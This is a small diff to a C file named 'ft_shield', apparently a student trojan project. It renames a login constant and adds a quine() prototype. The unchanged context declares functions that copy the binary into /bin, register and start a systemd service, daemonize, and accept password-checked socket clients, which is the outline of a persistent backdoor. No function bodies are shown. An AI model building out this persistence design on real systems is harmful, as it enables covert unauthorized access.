@@ -5,13 +5,11 @@
 #include <stdlib.h>
 #include <sys/stat.h>
 #include <string.h>
-#include <unistd.h>
 #include <arpa/inet.h>
 #include <sys/select.h>
 #include <errno.h>
 #include <fcntl.h>
 #include <signal.h>
-
 #include <sys/socket.h>
 #include <netinet/in.h>
 #include <unistd.h>
@@ -27,7 +25,7 @@
 #define SOURCE_FILE "ft_shield"
 #define DEST_FILE "/bin/ft_shield"
 #define SERVICE_NAME "ft_shield.service"
-#define LOGIN "bbrahim"
+#define LOGIN "yismaili"
 
 typedef struct {
     int _socket_fd;
@@ -45,10 +43,12 @@ typedef struct {
 
 Client client_arr[MAX_CLIENTS];
 
+void quine();
 
 void copy_binary_f(const char *sourcePath, const char *destinationPath);
 void enable_and_start_s(const char* service_name);
 void create_service(const char* service_name, const char* binary_path);
+
 void create_daemon();
 
 void hash(char *password, char *hash);
